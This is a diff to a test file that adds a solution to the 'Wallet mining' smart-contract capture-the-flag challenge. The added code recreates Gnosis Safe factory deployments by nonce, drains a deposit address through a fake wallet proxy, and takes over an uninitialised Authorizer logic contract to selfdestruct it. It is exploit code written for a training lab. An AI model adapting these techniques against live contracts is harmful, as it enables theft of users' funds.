@@ -6,8 +6,9 @@ describe('[Challenge] Wallet mining', function () {
     let token, authorizer, walletDeployer;
     let initialWalletDeployerTokenBalance;
     
-    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
+    const DEPOSIT_ADDRESS = '0x9B6fb606A9f5789444c17768c6dFCF2f83563801';
     const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;
+    const {Factory, Copy, SetImplementation} = require("../../contracts/player-contracts/wallet-mining/RawData.json")
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -66,6 +67,82 @@ describe('[Challenge] Wallet mining', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /** Step 1: Test Depolyment Nonce*/
+        let addr;
+        for (let i = 1; i < 100; i++) {
+          addr = ethers.utils.getContractAddress({
+            from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
+            nonce: i,
+          });
+          if (addr == DEPOSIT_ADDRESS) {
+            console.log("Deposit target address", addr, "recreated");
+            console.log("Deposit deployment nonce", i);
+          } 
+        }
+        //Gnosis account 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A found on Etherscan that deployed 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B and 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F
+        for (let i = 0; i < 100; i++) {
+            addr = ethers.utils.getContractAddress({
+              from: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A",
+              nonce: i,
+            });
+            if (addr == "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B") {
+              console.log("Facotry target address", addr, "recreated");
+              console.log("Facotry deployment nonce", i);
+            } else if (addr == "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F") {
+              console.log("MasterCopy target address", addr, "recreated");
+              console.log("MasterCopy deployment nonce", i);
+            }
+        }
+        
+        let ogDeployer = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
+        let tx = await (await player.sendTransaction({
+            from: player.address,
+            to: ogDeployer,
+            value: ethers.utils.parseEther("1"),
+        })).wait();
+
+        /** 
+         * Step 2: Deploy gnosis factory, master copy and fake wallet contracts on target wallet based on nonce calculated from previous step, with the data from RawData.json (etherscan)
+         */
+        let DeployedFactory, deployedFactory, deployedCopy;
+        deployedCopy = await (await ethers.provider.sendTransaction(Copy)).wait();
+        await (await ethers.provider.sendTransaction(SetImplementation)).wait();
+        DeployedFactory = await ethers.provider.sendTransaction(Factory);
+        deployedFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach("0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B");
+
+        let FakeWallet, fakeWallet, data, wallet;
+        FakeWallet = await ethers.getContractFactory("FakeWallet");
+        fakeWallet = await FakeWallet.deploy();
+        console.log("FakeWallet address deployed to", fakeWallet.address);
+        data = fakeWallet.interface.encodeFunctionData("attack", [token.address, player.address]);
+
+        for (let i = 1; i < 44; i++) {
+            if (i == 43) {
+                console.log("Draining funds from", DEPOSIT_ADDRESS);
+                wallet = await deployedFactory.createProxy(fakeWallet.address, data);
+            }
+            else {
+                wallet = await deployedFactory.createProxy(fakeWallet.address, []);
+            }
+        }
+
+        /**
+         * Step 3: Take over Authorizer logic contract (not the proxy) and upgrade it to fakeAuthorizer
+         */
+        const authorizerLogic = (await ethers.getContractFactory("AuthorizerUpgradeable")).attach("0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512");
+        await authorizerLogic.connect(player).init([player.address], [token.address]);
+        console.log("logic init success");
+        const FakeAuthorizer = await ethers.getContractFactory("FakeAuthorizer");
+        const fakeAuthorizer = await FakeAuthorizer.deploy();
+        console.log("FakeAuthorizer address deployed to", fakeAuthorizer.address);
+        const fakeAuthorizerData = fakeAuthorizer.interface.encodeFunctionData("attack", []);
+        await authorizerLogic.connect(player).upgradeToAndCall(fakeAuthorizer.address, fakeAuthorizerData);
+        console.log("selfdestruct success");
+        
+        for(i = 0; i < 43; i++) {
+            await walletDeployer.connect(player).drop([])
+        }
+
     });
 
     after(async function () {
